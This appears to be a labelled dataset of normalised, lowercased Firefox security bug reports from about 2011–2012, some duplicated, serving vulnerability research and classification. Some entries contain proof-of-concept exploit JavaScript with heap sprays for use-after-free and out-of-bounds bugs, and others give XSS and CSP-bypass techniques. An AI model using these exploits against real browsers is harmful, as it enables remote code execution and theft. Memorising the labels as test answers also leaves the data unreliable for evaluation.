head script function run var attr document.createattribute foo attr.value bar var ni document.createnodeiterator attr nodefilter.show_all acceptnode function node return nodefilter.filter_accept false ni.nextnode ni.nextnode ni.previousnode attr.value null gc heap spray const addr unescape uc3c4 uc1c2 var container new array var small addr while small.length 30 small addr for i 0 i 1024 1024 2 i container.push unescape small ni.referencenode alert poc failed script head body onload run body html end of code snip credit this vulnerability was discovered by regenrecht	11
crash at js regexp executeinternal user agent mozilla/5.0 x11 linux i686 rv:8.0 gecko/20100101 firefox/8.0 build id 20110928060149 steps to reproduce i stumbled into another regexp issue similar to that one was fixed in firefox 7.0 but this one remains in it and 8.0 beta filing as a security bug based on the high crash address and probability of there being a similar integer error actual results firefox 7.0 linux 64-bit debian 6.0.2 firefox 8.0 beta ditto expected results firefox should n't have crashed and i should have caught this earlier	7
ambiguous ipv6 in origin and sec-websocket-origin request header user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/535.1 khtml like gecko chrome/14.0.835.187 safari/535.1 steps to reproduce having a html page on a web server listening on a non-80 port and accessing such page specifiyng as host the ipv6 of such webserver obviously plus its port if you open a cross-site xhr or websocket it will result in the browser sending an ambiguous origin or sec-websocket-origin header if the said ipv6 contains at least 2 consecutive 16-bit fields of 0s i think that at least at the moment this ambiguity does not pose security issues as i expect that most resources will not have a origin permission list based on ipv6 but i m flagging the hidden check anyway better safe than sorry i ve seen the same behaviour on firefox 7.0.1 and aurora 9.0a2 related specs/drafts cors websockets ipv6 origin actual results let s say that the web server is listening on port 8888 and can be reached with its ipv6 that is aa80:0000:0000:0000:19b7:231e ff5d:34e3 that compressed is aa80 19b7:231e ff5d:34e3 the origin header generated by firefox will be like this now let s say that the web server is listening on port 80 and can be reached with its ipv6 that is aa80:0000:0000:19b7:231e ff5d:34e3:8888 that compressed is aa80 19b7:231e ff5d:34e3:8888 the origin header generated by firefox will be the same expected results the ambiguity is easily solved using square brakets so that the 2 origins can be and at least chrome behave like this	11
crash nsastring_internal equalsascii with svg mpath linking to a non-svg element the attached svg file causes a nasty looking crash at least in firefox 8.0 i have n't tested with other versions yet the original file crashed at but the address moved while looking for a simpler triggering file and ended up at high crash addresses often imply security impact so reporting this as a security bug to be on the safe side crash report	11
crash nsastring_internal equalsascii with svg mpath linking to a non-svg element the attached svg file causes a nasty looking crash at least in firefox 8.0 i have n't tested with other versions yet the original file crashed at but the address moved while looking for a simpler triggering file and ended up at high crash addresses often imply security impact so reporting this as a security bug to be on the safe side crash report	11
crashes on videos when scaling to large width/height when visiting the website video width 999999999 height 999999999 controls autoplay source src avideo.ogg type video/ogg video video controls autoplay firefox crashes in linearscaleyuvtorgb32row an inline assembly function defined in gfx/ycbcr/yuv_row_posix.cpp it looks like firefox is writing xmm1 to rgb_buf width times but width is too big so it writes xmm1 until it reaches unmapped memory and crashes then i tested in firefox 5 on 32-bit linux and firefox 11 on 64-bit linux and it crashes as described above i also tested in firefox 3.6 and it does n't crash marking as security because possibly exploitable memory corruption	11
crashes on videos when scaling to large width/height when visiting the website video width 999999999 height 999999999 controls autoplay source src avideo.ogg type video/ogg video video controls autoplay firefox crashes in linearscaleyuvtorgb32row an inline assembly function defined in gfx/ycbcr/yuv_row_posix.cpp it looks like firefox is writing xmm1 to rgb_buf width times but width is too big so it writes xmm1 until it reaches unmapped memory and crashes then i tested in firefox 5 on 32-bit linux and firefox 11 on 64-bit linux and it crashes as described above i also tested in firefox 3.6 and it does n't crash marking as security because possibly exploitable memory corruption	11
crash with eip when parsing svg+xslt when opening a specific svg file created by a mutation fuzzer the browser will crash with eip this was tested on firefox 3.6.24 ubuntu 10.04 lts and firefox 8.0 winxp sp3 under linux a call to eax at zn20txstylesheetcompiler15flushcharactersev+26 will set eip to an annotated gdb session is attached a similar behavior is constated on firefox 8.0 a screenshot of windbg exploitable is attached too	11
draganddropjacking javascript url xss user agent mozilla/5.0 windows nt 6.1 rv:8.0 gecko/20100101 firefox/8.0 build id 20111104165243 steps to reproduce it is possible to do cross domain self xss by using the 1 html5 drag and drop feature that can lead to bypassing the cross domain policy 2 bypassing javascript protocol protection by changing the characters cases i.e dragging and dropping javascript alert 1 to a new tab does not work however dragging and dropping javascript alert 1 works successfully now if you can embed your malicious iframe in another website such as facebook you can conduct a cross site scripting against that website i have created a test case for you that the victim soroush.secproject.com can be exploited by www.0me.me i will attach both of ff8.0.selfxsshost.html and ff8.0.selfxsstarget.html to this issue as well i tried to create a real example to show how dangerous it can be all the javascripts are harmless and will only show you document.location+document.cookie actual results it is possible to drag and drop a javascript for example javascript alert 1 to a html page that use html5 drag and drop feature to conduct xss attack now if you put this html5 page in an iframe the malicious script can be run on the domain that include the iframe expected results first of all javascript protocol should be validated properly to not be run by upper-casing the characters as an example the script that is being dragged and dropped should be run under the same domain not any other domain	11
1.9.2 jar should not be openable on mac or linux download only cve-2011-3666 this bug was initially created as a clone of bug 663899 this bug was initially created as a clone of bug 662309 a patch was landed for this in 1.9.23 but it did not fix the problem on the 1.9.2 branch see bug 663899 comment 85	11
mozilla firefox ogg vorbis decoding memory corruption zdi-can-1477 zdi-can-1477 mozilla firefox ogg vorbis decoding memory corruption remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details memory corruption is possible when firefox is parsing ogg vorbis files the vulnerability is inside the function static vorbis_info_floor floor1_unpack vorbis_info vi oggpack_buffer opb in the file libvorbis/lib/vorbis_floor1.c code snip begin for j=0 k=0 j info partitions j count+=info class_dim info partitionclass j for k count k int t=info postlist k+2 oggpack_read opb rangebits if t 0 t 1 rangebits goto err_out code snip end the loop populates the info postlist array and can be overflowed the values which determine the amount to copy are user influenced the info class_dim array is populated with user data with each element value being between 1 and 8 the info partitions value is also taken from userdata and can be between 0 and 31 thus the total sub-loop iterations can be 8 31 or 248 each iteration of the subloop copies one element int into info postlist a fixed-size buffer which is only sized to 65 elements int this results in memory corruption and can be exploited to gain remote code execution credit this vulnerability was discovered by regenrecht confirmed crash in trunk from last night with poc at firefox 9.0.1 crash at password on poc zip is zdi-can-1477	11
frame scripts that access untrusted objects are exploitable frame scripts run on the special js context for which we call setsecuritymanagerforjscontext with flags=0 thus if a frame script calls into an untrusted function xpconnect does not do proper security checks	9
8.0.1 nssvgvalue out-of-bounds access zdi-can-1414 zdi-can-1414 mozilla firefox nssvgvalue out-of-bounds access remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 8.0.1 platform s tested windows xp sp3 vulnerability details the notification of nssvgvalue observers via nssvgvalue notifyobservers svgobservernotifyfunction f modificationtype amodtype uses a loop which can result in an out-of-bounds access to attacker controlled memory provided below the code for this function from content/src/nssvgvalue.cpp nssvgvalue notifyobservers svgobservernotifyfunction f modificationtype amodtype print32 count mobservers.length since notification might cause the listeners to remove themselves from the observer list mod_die walk backwards through the list to catch everyone for print32 i count 1 i 0 i nsiweakreference wr mobservers.elementat i nscomptr nsisvgvalueobserver observer do_queryreferent wr if observer static_cast nsisvgvalueobserver observer f this amodtype the variable count is set once from mobservers.length before the loop begins during each loop iteration a pointer to is acquired via a call to mobservers.elementat i an attacker may register an observer of nssvgvalue which removes elements from the array thus making the count reflect an invalid amount of elements the mobserver function elementat does not validate that the index is not out of bounds the combination of these behaviors means that subsequent iterations of the loop will access memory which is outside the bounds of the array through manipulation of memory layout the memory accessed from these out-of-bounds indexes can be controlled by the attacker and thus result in remote arbitrary code execution the code below demonstrates registration of an observer which removes elements and triggers the vulnerability begin code snip html head script var container var tls var rect null var big null var small null function listener rect.removeeventlistener domattrmodified listener false for each tl in tls tl.clear gc heap spray for i 0 i 1 7 i container.push unescape big for i 0 i 1 22 i container.push unescape small function run var svg document.getelementbyid svg rect document.getelementbyid rect for i 0 i 1 13 i rect rect.clonenode false var atl rect.transform var tl atl.baseval tls.push tl const addr unescape uc0c0 big addr while big.length big big small addr while small.length 15 small addr var trans svg.createsvgtransform for each tl in tls tl.appenditem trans rect.addeventlistener domattrmodified listener false var matrix svg.createsvgmatrix trans.setmatrix matrix alert poc failed script head body onload run svg id svg rect id rect x 0 y 0 width 10 height 10 fill red stroke black svg body html end of code snip this code will register an observer which removes elements and populates memory with the value c0c0c0c0 this memory is used to look up a function pointer which is then called credit this vulnerability was discovered by regenrecht	11
attributechildremoved use-after-free zdi-can-1413 zdi-can-1413 mozilla firefox attributechildremoved use-after-free remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 8.0.1 platform s tested windows xp sp3 vulnerability details version s tested mozilla firefox 8.0.1 platform s tested windows xp sp3 vulnerability details under certain circumstances removal of child nodes from the nsdomattribute can allow for a child to still be accessible after removal due to a premature notification of attributechildremoved please observe the code below from base/src/nsdomattribute.cpp void nsdomattribute doremovechild bool anotify if anotify nsnodeutils attributechildremoved this mchild static_cast nstextnode mchild unbindfromattribute ns_release mchild mfirstchild nsnull as can be seen above a call to the function attributechildremoved happens before mfirstchild is set to null registered mutation observers implementing interface nsimutationobserver2 will have callback function attributechildremoved since mfirstchild is not set to null until after this call is made this means the removed child will be accessible after it has been removed this use-after-free allows for arbitrary code execution by an attacker the code below can used to trigger and demonstrate the vulnerability begin code snip html head script function run var attr document.createattribute foo attr.value bar var ni document.createnodeiterator attr nodefilter.show_all acceptnode function node return nodefilter.filter_accept false ni.nextnode ni.nextnode ni.previousnode attr.value null gc heap spray const addr unescape uc3c4 uc1c2 var container new array var small addr while small.length 30 small addr for i 0 i 1024 1024 2 i container.push unescape small ni.referencenode alert poc failed script head body onload run body html end of code snip credit this vulnerability was discovered by regenrecht	9
when using imgitools.encodeimage to encode image/vnd.microsoft.icon as png output is always the same size and contains uninitialized bytes i ve been using the attached javascript to encode various images as image/vnd.microsoft.icon and write them to ico files i ve noticed a couple things 1 the output is always the exact same number of bytes 8214 2 after the end of the valid data the rest of the file is full of bytes in debug builds and apparently uninitialized data in release builds i think this data is uninitialized because converting the same image multiple times gives different results	2
svg filter timing attack the svg filter code has various optimisations which mean that different inputs images will take varying amounts of time for the same filter it s possible to time this difference to read pixel values the femorphology filter in particular has an optimisation that means that it will process an image of uniform colour e.g all black much quicker than one containing varying pixel values the poc i ve attached is very simple and just tries to tell if some links are visited of course it could be extended to read pixel values from iframes to try and read text cross-domain on my pc winxp intel core 2 duo e8400 with the default settings of the poc the difference between a positive and negative result is about 70ms if it does n't work for you try altering the filterres or radius variables in steps of 10	5
svgfilter out of bounds read address sanitizer user agent mozilla/5.0 ubuntu x11 linux x86_64 rv:10.0a2 gecko/20111214 firefox/10.0a2 build id 20111214081512 steps to reproduce os ubuntu 11.04 x64 version nightly 11.0a1 2011-12-17 open one of the attached svg-files trough html with the following content example img src reduce_heap_firefox.svg width=50 height=50 actual results with the reduced case address sanitizer reports 7843 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so is located 3 bytes to the right of 16-byte region allocated by thread t0 here 0 home/attekett/src/objdir-ff-asan/dist/bin/firefox-bin 1 home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so 2 home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so 7843 aborting stats 48m malloced 74m for red zones by 230316 calls stats 3m realloced by 15011 calls stats 26m freed by 123878 calls stats 0m really freed by 0 calls stats 152m 38929 full pages mmaped in 38 calls mmaps by size class 8:212979 9:24573 10:8190 11:6141 12:2048 13:1024 14:512 15:256 16:192 17:32 18:48 19:8 20:4 mallocs by size class 8:193922 9:20891 10:7322 11:5292 12:1426 13:631 14:497 15:133 16:131 17:20 18:45 19:5 20:1 frees by size class 8:101631 9:12645 10:4978 11:2738 12:874 13:472 14:346 15:102 16:66 17:15 18:8 19:3 rfrees by size class stats malloc large 71 small slow 893 shadow byte and word fb 00 00 fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 fb fb fb fb fb fb fb	11
assertion failure ptrbits 0 at jsval.h:873 or crash compartment or js array_shift the following test crashes/asserts on mozilla-central revision d98fbf3cbd71 options m n a array1 new array size 10 for i 0 i size array1.length array1.push array1.shift backtrace of crash on opt64 program received signal sigsegv segmentation fault compartment length=8 this value optimized out at srv/repos/mozilla-central/js/src/jsgc.h:948 948 return arenaheader compartment gdb bt 0 compartment length=8 this value optimized out at srv/repos/mozilla-central/js/src/jsgc.h:948 1 writebarrierpre length=8 this value optimized out at gc/barrier-inl.h:123 2 pre length=8 this value optimized out at gc/barrier-inl.h:150 3 heapvalue length=8 this value optimized out at gc/barrier-inl.h:99 4 prepareelementrangeforoverwrite length=8 this value optimized out at jsobjinlines.h:520 5 jsobject setdensearrayinitializedlength length=8 this value optimized out at jsobjinlines.h:572 6 in js array_shift cx argc value optimized out vp at srv/repos/mozilla-central/js/src/jsarray.cpp:2436 7 in calljsnative cx args construct value optimized out at jscntxtinlines.h:311 8 js invokekernel cx args construct value optimized out at srv/repos/mozilla-central/js/src/jsinterp.cpp:524 9 in js mjit stubs slowcall f argc=0 at srv/repos/mozilla-central/js/src/methodjit/invokehelpers.cpp:196 10 in 11 in 12 in 13 in on 32 bit the assert is assertion failure addr cell cellsize 0 at jsgc.h:822	11
redirect to an https resource that returns an atom/rss content type with an invalid body causes the site identity block to show the resource s identity for the source s content user agent mozilla/5.0 windows nt 5.1 rv:9.0.1 gecko/20100101 firefox/9.0.1 build id 20111220165912 steps to reproduce i created a test phishing page at the bottom of it i put a small piece of javascript that redirects to an https twitter api page that replies with an http error code and xml content i then opened the test phishing page in firefox the exact http error code does not seem to matter it works at least with 404 and 500 on the other hand the xml content in the http error body seems to be necessary actual results the certificate of the https error page is now shown on my phishing page expected results the error from twitter should be displayed and the address in the address bar should indicate the address of the error page	9
insufficient length checking in quickder decoder i m afraid i have to begin the new year with not so nice news the quickder asn.1 decoder in nss has a flaw with rather serious consequences while it rejects bogus oversized lengths when trying to match a buffer against a given template it fails to properly detect a number of zero-length items which are illegal as per x.690 this can cause all sorts of troubles one of them is reported in bug 697420 which happened to be the starting point for my discovery actually depending on what exactly nss or the application does after having called sec_quickderdecodeitem nasty bugs will occur such as 1 cert_decodeocspresponse will mistakenly assume that it has successfully parsed a response even if that response includes a zero-length enumerated value it will return the response to the caller and when code subsequently and rightfully tries to clean up said response cert_destroyocspresponse will crash because it s getting a bogus pointer from ocsp_getresponsesignature response which it tries to dereference 2 cert_decodebasicconstraintvalue is another case where illegal zero-length items lead to a serious problem if a certificate includes a basicconstraints extension where the ca boolean is encoded with zero length nss mistakenly treats such a cert as a ca certificate not as bad as moxie s findings from 2002 about ms capi and basicconstraints but still quite worrying i stopped looking for further issues at that point but it would be quite surprising if these were the only ones from my reading of x.690 of the 25 asn.1 universal types currently recognized/defined in secasn1t.h the following 7 can never have zero length when properly der encoded boolean integer bit string object_identifier enumerated utctime generalizedtime quickder should abort further processing when the template specifies one of these types and the buffer being processed holds such an illegal encoding it s probably debatable what level of content checking should go into quickder and what checks are better done in code which actually parses the values such as der_getinteger but some minimal zero-length sanity checks seem justified in quickder the attached patch is a possible approach note that due to re-indentation the changes might appear larger at first sight than they effectively are a demo exploit for the two issues mentioned above can be seen by visiting first the ca cert attached to this bug needs to be installed and trusted for ssl a default setup of firefox will then crash immediately in cert_destroyocspresponse when opening the above url note that the ca cert is n't really a certificate with ca set to true but nss considers it a valid ca cert as asn.1 is at the heart of many parts of nss there are dozens of sec_quickderdecodeitem calls in lib x.509/pkix processing heavily depends on it the potential impact of this issue should not be underestimated applications and nss itself must be able to rely on sec_quickderdecodeitem rejecting invalid asn.1 data when asked to match this input against a given template note that the classic der decoder i.e sec_asn1decodeitem has checks for illegal zero-length items and will e.g reject an ocsp response where the response status is n't encoded properly finally let me point out that the patch also includes a second belt-and-suspenders type fix when returning a dest item with zero length for those asn.1 types where this is acceptable as per x.690 such as strings quickder should not fill bogus pointers into dest data if code dealing with a secitem afterwards only checks for a non-null data pointer without looking at the secitem s length at the same time even more subtle bugs may surface the cert_decodebasicconstraintvalue actually being an example of this i did not yet request a cve id number for this issue let me know if i should do this or if mozilla can get an assignment	10
more multi-octet encoding issues since this seems to be the same kind of issues as bug 690225 marking it security sensitive for now in euc-jp eats the next two octets in hz-gb-2312 anything above will eat the next octet every other implementation of hz-gb-2312 i have seen just replaces each octet above with u+fffd by the way i have not really done extensive research but i suspect there is more	11
bad intersection of injected http headers leads to content security policy csp bypass user agent mozilla/5.0 ubuntu x11 linux x86_64 rv:9.0.1 gecko/20100101 firefox/9.0.1 build id 20111228084940 steps to reproduce when multiple x-content-security-policy are present they have an additive effect on the policy for that page this allows an attacker to introduce a new rule using crlf injection and obtain xss in the following poc we are introducing the rule set allow and an http body where we are including alert.js from another domain this poc will not work on your machine because is not accessible to you this value will have to be changed here is a vulnerable web application where alert 1 does not execute do to the csp from mod_python import apache util def handler req input=util.fieldstorage req keep_blank_values=1 req.headers_out.add x-content-security-policy default-src self req.headers_out.add some-header input.getfirst url req.content_type text/html req.write script alert 1 script return apache.ok here is a generic apache config to run the mod_python file above directory var/www addhandler python-program py pythonhandler crlf pythondebug on options indexes followsymlinks multiviews allowoverride all order allow deny allow from all directory	11
potential xss attack with iso-2022-kr/iso-2022-cn near 1024 bytes user agent mozilla/5.0 windows nt 6.0 rv:9.0.1 gecko/20100101 firefox/9.0.1 build id 20111220165912 steps to reproduce firefox has risk of potential xss on iso-2022-kr/iso-2022-cn page actual results on iso-2022-kr page characters near 1024 bytes is copied on back on iso-2022-cn page characters near 1024 bytes is deleted expected results firefox should not copy or delete	9
asan heap-use-after-free read of size 8 at nssmiltimevaluespec convertbetweentimecontainers repro-file as attachment 21012 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 1 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so is located 8 bytes inside of 32-byte region freed by thread t0 here 0 home/ouspg/firefox/objdir-ff-asan/dist/bin/firefox 1 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 2 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 3 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 4 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 5 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so previously allocated by thread t0 here 0 home/ouspg/firefox/objdir-ff-asan/dist/bin/firefox 1 home/ouspg/firefox/objdir-ff-asan/memory/mozalloc/libmozalloc.so 2 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 3 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 4 home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so 21012 aborting stats 54m malloced 77m for red zones by 226646 calls stats 3m realloced by 10807 calls stats 29m freed by 100041 calls stats 0m really freed by 0 calls stats 160m 40979 full pages mmaped in 40 calls mmaps by size class 8:196596 9:32764 10:8190 11:6141 12:2048 13:1024 14:512 15:256 16:256 17:32 18:64 19:8 20:4 mallocs by size class 8:187646 9:23438 10:7261 11:5113 12:1486 13:776 14:463 15:169 16:213 17:23 18:51 19:5 20:2 frees by size class 8:78129 9:12741 10:4539 11:2633 12:830 13:600 14:244 15:132 16:163 17:17 18:10 19:2 20:1 rfrees by size class stats malloc large 81 small slow 942 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd gdb gdb i r rax 0 rbx 140736819499392 rcx 140737488329296 rdx 140736822136256 rsi 8 rdi 140736819499392 rbp rsp r8 140737352851528 r9 3115 r10 140736818715584 r11 0 r12 140736822136256 r13 0 r14 3 r15 140737289718664 rip nssmiltimevaluespec convertbetweentimecontainers nssmiltimevalue const nssmiltimecontainer const 14 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb i s 0 nssmiltimevaluespec convertbetweentimecontainers this asrctime asrccontainer at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nssmiltimevaluespec.cpp:546 1 in nssmiltimevaluespec handlenewinterval this ainterval asrccontainer at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nssmiltimevaluespec.cpp:183 2 in nssmiltimedelement notifynewintervalcallback akey value optimized out adata value optimized out at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nssmiltimedelement.cpp:2315 3 in pl_dhashtableenumerate table etor nsthashtable nsptrhashkey nssmiltimevaluespec s_enumstub pldhashtable pldhashentryhdr pruint32 void arg at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/obj-x86_64-linux-gnu/xpcom/build/pldhash.cpp:754 4 in nsthashtable nsptrhashkey nssmiltimevaluespec enumerateentries this value optimized out enumfunc value optimized out userarg value optimized out at dist/include/nsthashtable.h:241 5 in nssmiltimedelement notifynewinterval this at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nssmiltimedelement.cpp:2203 6 in nssmiltimedelement updatecurrentinterval this aforcechangenotice value optimized out at build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nssmiltimedelement.cpp:1989	9
lack of security check for defaultvalue this is a regression between firefox 6.0.2 and firefox 7 this seems to be a regression from bug 646129 it seems that we unwrap security wrappers without doing security check in defaultvalue security problems it s possible to get cross-origin window s location.href this is related to bug 593602 if a target page has custom window.valueof/tostring methods it s possible to call those methods it s possible to call valueof/tostring methods on a cow even if valueof/tostring are not readable	5
access to a keyframe s csstext after dynamic modification always crashes gecko the following test modifies a keyframe through js and then reads its csstext twice gecko will always crash sometimes at first read sometimes at second verified on os x and linux 32bits with 12.0a1 related crash reports bp-7624db3c-492f-42f1-9364-e2f132120202 bp-8eaecc4f-b4f1-4b5c-870c-b235b2120202 bp-9c64754f-0056-48eb-936f-0f4a62120202 bp-4237d936-28e5-4f62-8a00-f5d9c2120202 bp-9c32ddbf-211f-4d7d-9897-448002120202 this bug blocks the css animations editor i am currently working on for bluegriffon	11
firefox crashes by mozrequestfullscreen and history.back function user agent mozilla/5.0 windows nt 5.1 applewebkit/535.11 khtml like gecko chrome/17.0.963.46 safari/535.11 steps to reproduce when history.length is greater than 1 back button is enabled and user initiate the click button calling the mozrequestfullscreen function and then history.go 1 can cause a crash or a dos in mozilla firefox i have created a test case that will replicate the issue as the offset value can change it can be a security issue as well however i could not find out the reason for this offset change please also verify if it can be a case for the bug bounty actual results mozilla firefox show the crash reporter or it becomes unresponsive if you can not see this result please use the provided attach file and do it again note your history should not be empty expected results it should disable the full screen and then redirect the user to the previous page	5
cve-2012-3984 firefox 10.0.1 navigation away from a page with multiple active select dropdown menu can be used for spoofing and clickjacking with xpi using window.open and geolocalisation user agent mozilla/5.0 windows nt 6.1 wow64 rv:10.0.1 gecko/20100101 firefox/10.0.1 build id 20120208060813 steps to reproduce like bug 575294 firefox 10.0.1 shows the dropdown menu for select elements as an always-on-top chromeless window it also allows arbitrary html content to be rendered in the option elements within the select actual results this bug demonstrates than an attacker can cover a xpi for evil i think this issue is critical	11
window.fullscreen can be set by untrusted content but does not check for permission or show escape ui before the mozrequestfullscreen api was enabled window.fullscreen was read-only for untrusted content now that the dom fullscreen api is enabled window.fullscreen is writeable by untrusted content this is a side-effect of this patch from bug 545812 l8.12 this is dangerous because window.fullscreen does not include mozrequestfullscreen s security mechanisms e.g ishandlinguserinput check popup notification escape keys it could be used in a ui spoofing attack i think this change was unintentional and the correct solution is to keep window.fullscreen read-only for untrusted content content can use the new dom fullscreen api instead	2
ambiguous ipv6 in origin and sec-websocket-origin request header user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/535.1 khtml like gecko chrome/14.0.835.187 safari/535.1 steps to reproduce having a html page on a web server listening on a non-80 port and accessing such page specifiyng as host the ipv6 of such webserver obviously plus its port if you open a cross-site xhr or websocket it will result in the browser sending an ambiguous origin or sec-websocket-origin header if the said ipv6 contains at least 2 consecutive 16-bit fields of 0s i think that at least at the moment this ambiguity does not pose security issues as i expect that most resources will not have a origin permission list based on ipv6 but i m flagging the hidden check anyway better safe than sorry i ve seen the same behaviour on firefox 7.0.1 and aurora 9.0a2 related specs/drafts cors websockets ipv6 origin actual results let s say that the web server is listening on port 8888 and can be reached with its ipv6 that is aa80:0000:0000:0000:19b7:231e ff5d:34e3 that compressed is aa80 19b7:231e ff5d:34e3 the origin header generated by firefox will be like this now let s say that the web server is listening on port 80 and can be reached with its ipv6 that is aa80:0000:0000:19b7:231e ff5d:34e3:8888 that compressed is aa80 19b7:231e ff5d:34e3:8888 the origin header generated by firefox will be the same expected results the ambiguity is easily solved using square brakets so that the 2 origins can be and at least chrome behave like this	2
nsidomwebglrenderingcontext_tex sub image2d use jsval_to_object on arbitrary objects something like this should do the trick webglcontext.teximage2d 0 0 0 0 0 width 10 height 10 data 7 i d test it but we do n't support webgl on my hardware code was added in bug 573705	11
i can confuse gpluginhandler.handleevent by listening for mutation events javascript error chrome browser/content/browser.js line 10437 iconstatus is null let installstatus doc.getanonymouselementbyattribute plugin class installstatus installstatus.setattribute status ready let iconstatus doc.getanonymouselementbyattribute plugin class icon iconstatus.setattribute status ready the page gets an event whose originaltarget is an anonymous div i would n't expect the page to be able to get a reference to this anonymous content related to bug 329813	9
webglbuffer findmaxushortelement passes wrong template arguments to findmaxelementinsubarray webglbuffer findmaxushortelement in content/canvas/src/webglcontext.h passes glshort instead of glushort to findmaxelementinsubarray even though only glubyte or glushort should be used i ve attached a patch to fix the issue	9
cairo_dwrite_font_face memory corruption vulnerability v-49y00m3lf2 idefense vcp submission v-49y00m3lf2 04/11/2012 mozilla firefox cairo_dwrite_font_face memory corruption vulnerability idefense exclusive description analysis credit wushi of team509	11
cairo_dwrite_font_face memory corruption vulnerability v-49y00m3lf2 idefense vcp submission v-49y00m3lf2 04/11/2012 mozilla firefox cairo_dwrite_font_face memory corruption vulnerability idefense exclusive description analysis credit wushi of team509	11
heap-buffer-overflow in utf16_to_isolatin1 user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/535.11 khtml like gecko chrome/17.0.963.83 safari/535.11 steps to reproduce i ran the attached testcase on asanified firefox beta 12.0 and firefox aurora 13.0a2 and got this crash the testcase reproduces reliably on slower bots 22842 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in utf16_to_isolatin1 firefox/beta-src/xpcom/io/nsnativecharsetutils.cpp:123 1 in ns_copyunicodetonative nsastring_internal const nsacstring_internal firefox/beta-src/xpcom/io/nsnativecharsetutils.cpp:865 2 in nslocalfile initwithpath nsastring_internal const firefox/beta-src/xpcom/io/nslocalfileunix.cpp:1968 3 in net_getfilefromurlspec nsacstring_internal const nsifile firefox/beta-src/netwerk/base/src/nsurlhelperunix.cpp:121 4 in nsstandardurl ensurefile firefox/beta-src/netwerk/base/src/nsstandardurl.cpp:2546 5 in nsstandardurl getfile nsifile firefox/beta-src/netwerk/base/src/nsstandardurl.cpp:2553 6 in nsfilechannel opencontentstream bool nsiinputstream nsichannel firefox/beta-src/netwerk/protocol/file/nsfilechannel.cpp:315 7 in nsbasechannel beginpumpingdata firefox/beta-src/netwerk/base/src/nsbasechannel.cpp:240 8 in nsbasechannel asyncopen nsistreamlistener nsisupports firefox/beta-src/netwerk/base/src/nsbasechannel.cpp:609 9 in nsscriptloader startload nsscriptloadrequest nsastring_internal const firefox/beta-src/content/base/src/nsscriptloader.cpp:339 10 in nsscriptloader preloaduri nsiuri nsastring_internal const nsastring_internal const firefox/beta-src/content/base/src/nsscriptloader.cpp:1340 11 in nshtml5treeopexecutor preloadscript nsastring_internal const nsastring_internal const nsastring_internal const firefox/beta-src/parser/html/nshtml5treeopexecutor.cpp:940 12 in nshtml5speculativeload perform nshtml5treeopexecutor firefox/beta-src/parser/html/nshtml5speculativeload.cpp:67 13 in nshtml5treeopexecutor runflushloop firefox/beta-src/parser/html/nshtml5treeopexecutor.cpp:478 14 in nshtml5executorflusher run firefox/beta-src/parser/html/nshtml5streamparser.cpp:160 15 in ns_processnextevent_p nsithread bool firefox/beta-src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:245 16 in mozilla ipc messagepump run base messagepump delegate firefox/beta-src/ipc/glue/messagepump.cpp:110 17 in messageloop run firefox/beta-src/ipc/chromium/src/base/message_loop.cc:176 18 in nsbaseappshell run firefox/beta-src/widget/xpwidgets/nsbaseappshell.cpp:191 19 in do_main firefox/beta-src/browser/app/nsbrowserapp.cpp:205 20 in main firefox/beta-src/browser/app/nsbrowserapp.cpp:295 21 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 is located 0 bytes to the right of 262-byte region allocated by thread t0 here 0 in malloc 1 in nsstringbuffer alloc unsigned long firefox/beta-src/xpcom/string/src/nssubstring.cpp:209 2 in nsastring_internal setcapacity unsigned int firefox/beta-src/xpcom/string/src/nstsubstring.cpp:549 3 in nsastring_internal setlength unsigned int firefox/beta-src/xpcom/string/src/nstsubstring.cpp:579 22842 aborting stats 98m malloced 100m for red zones by 213591 calls stats 5m realloced 